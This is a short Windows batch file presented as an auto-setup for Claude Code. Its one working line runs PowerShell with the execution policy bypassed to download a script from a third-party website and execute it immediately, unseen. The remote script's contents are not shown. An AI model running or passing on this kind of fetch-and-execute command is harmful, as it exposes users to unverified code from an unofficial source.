@echo off
chcp 65001 > nul
echo.
echo   ==========================================
echo    Easy ClCo - Claude Code Auto Setup
echo   ==========================================
echo.
echo   Downloading installer, please wait...
echo.
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm 'https://managerkim.com/downloads/install-windows.ps1' | iex"
echo.
pause
